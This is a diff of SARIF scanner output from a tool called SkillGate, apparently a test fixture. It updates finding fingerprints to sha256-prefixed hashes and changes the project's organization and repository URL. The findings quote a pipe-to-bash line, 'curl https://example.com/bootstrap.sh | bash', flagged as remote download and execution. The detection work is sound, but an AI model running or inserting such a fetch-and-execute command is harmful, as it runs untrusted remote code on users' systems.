@@ -24,7 +24,7 @@
             "text": "Shell execution detected: #!/usr/bin/env bash"
           },
           "partialFingerprints": {
-            "skillgateFinding/v1": "7ca7dc5aa8e7a40d9f89ee825e3f3eb7bf905edc9d3e6880be793b203042803e"
+            "skillgateFinding/v1": "sha256:a00f768d3af5c307361c93be8cfbbf2c3d6ae525164a9480f188cc39a54e2944"
           },
           "properties": {
             "capability": "shell_execution",
@@ -63,7 +63,7 @@
             "text": "Shell execution detected: curl https://example.com/bootstrap.sh | bash"
           },
           "partialFingerprints": {
-            "skillgateFinding/v1": "3cdebad1c0f9f407de1250745cf4a4f48b4ecc45be3aceb6f2a2e38ef46a9013"
+            "skillgateFinding/v1": "sha256:b2beb3a3f8a70a51270dab79f0aca228933f19eda0887b7307834f7e959493e0"
           },
           "properties": {
             "capability": "shell_execution",
@@ -102,7 +102,7 @@
             "text": "Network egress detected: Host: example.com"
           },
           "partialFingerprints": {
-            "skillgateFinding/v1": "574bf5e78661d5306e0861c74d25ada59dbe302e073feb0bf19a00e7496cf03b"
+            "skillgateFinding/v1": "sha256:b74abff7ed735cc2d4ec9cda268dd10b97cd3900e72f3a9ef04b8f64bea54723"
           },
           "properties": {
             "capability": "network_egress",
@@ -141,7 +141,7 @@
             "text": "Remote download followed by execution: curl https://example.com/bootstrap.sh | bash"
           },
           "partialFingerprints": {
-            "skillgateFinding/v1": "46b9a34358c9f0a711f9652337d06b8e504f081c1b5f66f4e3a1fe9e76f2ae8b"
+            "skillgateFinding/v1": "sha256:ed8ddfc3ed6edd5e4cebec141a7899e645e73aaeb99779ebb3fdb065b8bb9cab"
           },
           "properties": {
             "capability": "remote_download_execution",
@@ -166,7 +166,7 @@
       "taxonomies": [
         {
           "name": "SkillGate capabilities",
-          "organization": "OpenEvalGate",
+          "organization": "Chenye Zhu / SkillGate",
           "taxa": [
             {
               "id": "destructive_action",
@@ -257,7 +257,7 @@
       ],
       "tool": {
         "driver": {
-          "informationUri": "https://github.com/OpenEvalGate/skillgate",
+          "informationUri": "https://github.com/charliechenye/SkillGate",
           "name": "SkillGate",
           "rules": [
             {
